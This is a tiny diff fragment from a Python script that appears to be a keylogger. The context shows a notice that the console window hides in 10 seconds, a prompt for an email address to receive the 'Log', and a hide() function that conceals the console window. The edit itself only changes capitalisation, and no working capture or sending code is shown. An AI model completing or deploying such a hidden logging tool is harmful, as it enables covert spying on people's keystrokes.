@@ -29,7 +29,7 @@ WINDOW IS HIDDING IN 10 SECONDS. TO END THE PROGRAM
 	''')
 time.sleep(10)
 
-toaddr = input("Enter the mail id on which you need log: ")
+toaddr = input("Enter the mail id on which you need Log: ")
 
 def hide():
 	window = win32console.GetConsoleWindow()
